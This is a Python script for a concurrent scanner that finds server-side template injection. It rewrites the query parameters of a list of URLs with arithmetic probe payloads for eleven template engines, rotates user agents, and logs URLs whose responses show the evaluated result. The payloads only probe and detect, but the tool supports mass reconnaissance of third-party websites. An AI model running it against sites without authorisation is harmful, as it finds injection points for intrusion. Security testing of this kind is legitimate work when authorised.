import asyncio
import urllib.parse
import aiohttp
from scripts.useragent.user_agent import _useragent_list
import random
from colorama import init, Fore
import re

init()

cyan = Fore.CYAN
green = Fore.GREEN
reset = Fore.RESET

IGNORE_CODES = [
    # 1xx → Informational
    100,  # Continue
    101,  # Switching Protocols
    102,  # Processing
    103,  # Early Hints

    # 2xx sin contenido útil
    204,  # No Content
    205,  # Reset Content

    # 3xx → Redirecciones / caching
    301,  # Moved Permanently
    302,  # Found
    303,  # See Other
    304,  # Not Modified
    307,  # Temporary Redirect
    308,  # Permanent Redirect

    # 4xx poco relevantes
    400,  # Bad Request
    401,  # Unauthorized
    403,  # Forbidden

    # Otros
    418,  # I'm a teapot (Easter egg)
    421   # Misdirected Request
]

PATTERN = re.compile(r"737[\s,.\-]*168[\s,.\-]*202[\s,.\-]*225")
SSTI_PAYLOADS = {
    "Jinja2 (Python Flask/Django)": "{{858585*858585}}",
    "Twig (PHP Symfony)": "{{858585*858585}}",
    "Smarty (PHP)": "{858585*858585}",
    "Mako (Python)": "${858585*858585}",
    "Velocity (Java)": "${858585*858585}",
    "Freemarker (Java)": "${858585*858585}",
    "ERB (Ruby on Rails)": "<%= 858585*858585 %>",
    "JSP/EL (Java)": "${858585*858585}",
    "Go Templates": "{{858585*858585}}",
    "Nunjucks (Node.js)": "{{858585*858585}}",
    "EJS (Node.js)": "<%= 858585*858585 %>"
}

ssti_found = set()
sem = asyncio.Semaphore(50)
async def ssti_scan(url, session):
    for key,payload in SSTI_PAYLOADS.items():
        user_agent = random.choice(_useragent_list)
        urlparse = urllib.parse.urlparse(url)
        qs = urllib.parse.parse_qsl(urlparse.query)
        new_qs = [(k,payload) for k,value in qs]
        encode_new_qs = urllib.parse.urlencode(new_qs)
        new_url = urllib.parse.urlunparse(urlparse._replace(query=encode_new_qs))
        header = {"User-Agent":user_agent}
        async with sem:
            try:
                async with session.get(url=new_url, headers=header, timeout=10) as response:
                    response_text = await response.text()
                    if response.status not in IGNORE_CODES and re.search(PATTERN, response_text):
                        print(f"[+-------------------------------------------+]\n{cyan}[Template Use] {key}{reset}\n{green}[POSSIBLE SSTI FOUND ] {new_url}{reset}\n[+-------------------------------------------+]")
                        ssti_found.add(new_url)
            except Exception:
                pass
async def main(list_urls):
    with open(list_urls, 'r') as file_read:
        urls = file_read.readlines()
    async with aiohttp.ClientSession() as session:
        tasks = []
        for url in urls:
            url = url.strip()
            if "=" in url:
                tasks.append(ssti_scan(url,session))
        await asyncio.gather(*tasks)
    
    print(f"SSTI Scan Complete. Found {len(ssti_found)}")

    if ssti_found:
        with open("ssti_evillight.txt", 'a') as write:
            for found in ssti_found:
                write.write(found+"\n")